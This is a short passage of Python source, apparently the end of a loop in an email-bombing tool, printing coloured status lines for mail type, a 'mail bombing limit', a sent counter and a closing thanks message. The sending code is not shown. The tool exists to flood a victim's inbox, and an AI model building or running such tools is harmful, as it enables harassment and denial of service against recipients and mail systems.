        print(f'{gcl}MAIL TYPE {acl}: {bcl}{mailtypechk(mail)}{ncl}\n')
        print(f'{gcl}MAIL BOMBING LIMIT {acl}: {pcl}{threat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {nil}{acl} ]{ccl}.{ncl}\n')
         
        if threat<=nil:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
        else:
          pass
      else:
        pass
    except :
      pass
